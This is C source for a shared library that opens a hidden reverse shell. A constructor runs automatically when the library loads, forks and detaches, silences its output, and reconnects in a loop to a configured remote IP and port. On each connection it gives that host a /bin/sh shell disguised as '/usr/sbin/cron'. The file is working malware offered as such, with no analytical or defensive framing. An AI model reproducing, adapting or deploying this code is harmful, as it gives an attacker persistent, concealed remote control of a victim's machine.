// A shared object that spawns a reverse shell
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/prctl.h>
#include "config.h"

__attribute__((constructor))
void stealth_shell() {
    pid_t pid = fork();
    if (pid < 0)
    {
        PERROR("fork failed");
        return;
    }
    if (pid > 0) exit(0);      // parent exits immediately

    // Child process continues:
    setsid();                  // detach from terminal
    chdir("/");

    // Rename process to "systemd" (or other innocuous name)
    // prctl(PR_SET_NAME, "/usr/sbin/cron", 0, 0, 0);

    // Redirect std fds to /dev/null initially
    int nullfd = open("/dev/null", O_RDWR);
    if (nullfd >= 0) {
        dup2(nullfd, 0);
        dup2(nullfd, 1);
        dup2(nullfd, 2);
        if (nullfd > 2) close(nullfd);
    }

    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            sleep(RECONNECT_DELAY);
            continue;
        }

        struct sockaddr_in sa = {0};
        sa.sin_family = AF_INET;
        sa.sin_port = htons(REMOTE_PORT);
        sa.sin_addr.s_addr = inet_addr(REMOTE_IP);

        if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
            // Redirect socket to stdio
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            if (sock > 2) close(sock);

            // Prepare argv with custom name
            char *const argv[] = {"/usr/sbin/cron", NULL};
            execve("/bin/sh", argv, NULL);

            // If execve fails:
            close(sock);
        } else {
            close(sock);
        }
        sleep(RECONNECT_DELAY);
    }
}
